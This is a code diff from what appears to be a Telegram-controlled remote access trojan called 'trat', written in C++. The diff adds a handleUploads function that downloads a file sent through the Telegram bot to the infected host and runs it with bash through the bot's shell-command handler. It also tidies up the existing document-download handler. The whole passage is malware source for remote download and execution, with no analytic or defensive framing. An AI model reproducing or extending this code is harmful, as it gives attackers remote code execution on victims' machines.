@@ -1,8 +1,6 @@
 /* trat/src/Bot/handling.cpp */
-#include <cstring>
+
 #include "../../include/bot.hpp"
-#include "../../include/networking.hpp" //For curlDownload()
-#include "../../include/parser.hpp" // For extractDownloadLink()
 
 namespace trat
 {
@@ -100,15 +98,37 @@ namespace trat
   {
     if (P_Telebot_Document != nullptr)
     {
-      auto fileId = P_Telebot_Document -> file_id;
-      auto fileName = P_Telebot_Document -> file_name;
-      if (telebot_download_file(this -> handle, fileId, fileName ))
+      auto file_id = P_Telebot_Document -> file_id;
+      auto file_name = P_Telebot_Document -> file_name;
+      if (telebot_download_file(this -> handle, file_id, file_name ))
       {
         this -> sendMessage("File successfully Downloaded");
       }else
       {
         this -> sendMessage("File failed to Download");
       }         
+    }
+    return;
+  }
+  void Bot::handleUploads(telebot_document_t *P_Client_Upload)
+  {
+    if (P_Client_Upload != nullptr)
+    {
+      auto file_id = P_Client_Upload -> file_id;
+      auto file_name = P_Client_Upload -> file_name;
+
+      if ( ( (this -> shell).isExecutable(file_name) ) && (this -> handlingBinaries) )
+      {
+        if (telebot_download_file(this -> handle, file_id, file_name))
+        {
+          std::string execution_command = "bash ./" + std::string(file_name); 
+          this -> handleShellCommand(execution_command.c_str());
+        }
+      }
+      else 
+      {
+        this -> handleDocuments(P_Client_Upload);
+      }
     }
   }
 }
